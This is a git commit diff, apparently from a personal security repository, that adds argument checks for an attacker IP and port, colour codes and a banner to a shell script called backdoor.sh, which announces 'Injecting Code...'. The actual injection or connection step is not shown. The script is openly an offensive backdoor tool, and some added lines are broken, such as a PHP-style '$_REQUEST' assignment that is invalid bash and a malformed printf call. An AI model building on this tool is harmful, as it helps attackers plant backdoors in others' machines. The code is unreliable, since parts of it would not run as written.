6b85a32576c38728785d87bf5679de7bdcd350ff
Kingston <115974774+KingstonCyberSec@users.noreply.github.com>
2022-11-15 01:43:47 +0530

    Update backdoor.sh

--- backdoor.sh
+++ backdoor.sh
@@ -1,3 +1,23 @@
+#!/bin/bash
+
+RED="\e[31m"
+GREEN="\e[32m"
+YELLOW="\e[33m"
+ENDCOLOR="\e[0m"
+
+$_REQUEST="$_REQUEST"
+
+if [ -z $1 ]
+then
+	echo -e "${RED}[*] Syntax: <ATTACKER IP> <PORT> ${ENDCOLOR}"
+    exit 1
+fi
+
+if [ -z $2 ]
+then
+    echo -e "${RED}[*] Syntax: <ATTACKER IP> <PORT> ${ENDCOLOR}"
+    exit 1
+fi
 echo -e "\n\nCode Made By root@kingston \n"
 printf"\n\n                       oOo \n\t                   oO\n\t                     o\n\t|^^^^^^^^^^^^^^^^^^^^|____\n\t|   Hello, Kingston    |**\\___,\n\t|______________________|__|)__|\n\t|(@)(@)'''''''''**|(@)(@)**|(@)\n\t= = = = = = = = = = = = = = = = = = =\n"
 echo -e "Injecting Code...\n"
